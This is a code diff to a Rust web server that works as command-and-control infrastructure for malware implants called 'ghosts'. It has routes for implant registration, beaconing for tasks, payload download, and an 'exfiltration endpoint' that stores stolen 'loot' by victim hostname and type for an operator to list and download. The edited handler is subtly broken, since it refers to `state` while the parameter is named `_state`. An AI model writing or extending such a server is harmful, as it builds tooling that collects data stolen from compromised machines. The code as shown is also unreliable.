@@ -204,13 +204,17 @@ async fn handle_ghost_heartbeat(
 }
 
 async fn handle_ghost_upload(
+    Path((id, loot_type)): Path<(String, String)>,
     State(_state): State<Arc<ServerState>>,
     body: Bytes
 ) -> Json<String> {
-    println!("receiving loot...");
-    let timestamp = chrono::Utc::now().timestamp();
-    let filename = format!("loot/loot_{}.dat", timestamp);
+    let hostname = state.ghosts.get(&id).map(|g| g.hostname.clone()).unwrap_or_else(|| "unknown".to_string());
 
+    println!("receiving loot from GHOST {} (ID: {})...", hostname, id);
+
+    let readable_date = chrono::Utc::now().format("%d-%m-%Y-%H%M%S").to_string();
+    let filename = format!("loot/{}_{}_{}.dat", hostname, readable_date, loot_type);
+    
     if let Err(e) = tokio::fs::create_dir_all("loot").await {
         println!("ERROR failed to create loot dir: {}", e);
         return Json("ERROR".to_string());
@@ -448,7 +452,7 @@ pub fn app(state: Arc<ServerState>) -> Router {
     let ghost_routes = Router::<Arc<ServerState>>::new()
         .route("/register", post(handle_ghost_register))        // ghost init (register)
         .route("/heartbeat", post(handle_ghost_heartbeat))      // ghosts will beacon to get tasks from here (or will just beacon their status and get back whether or not they have a task; smth to think about)
-        .route("/upload", post(handle_ghost_upload))            // exfiltration endpoint for data dumps
+        .route("/upload/{id}/{type}", post(handle_ghost_upload))    // exfiltration endpoint for data dumps
         .nest_service("/download", serve_dir);
 
     let charon_routes = Router::<Arc<ServerState>>::new()
@@ -462,7 +466,6 @@ pub fn app(state: Arc<ServerState>) -> Router {
         .route("/loot", get(handle_charon_list_loot))
         .nest_service("/loot/download", serve_loot);
 
-    // init router with route -> handler mapping
     Router::<Arc<ServerState>>::new()
         .route("/health", get(|| async { "OK" }))
         .nest("/api/v1/ghost", ghost_routes)
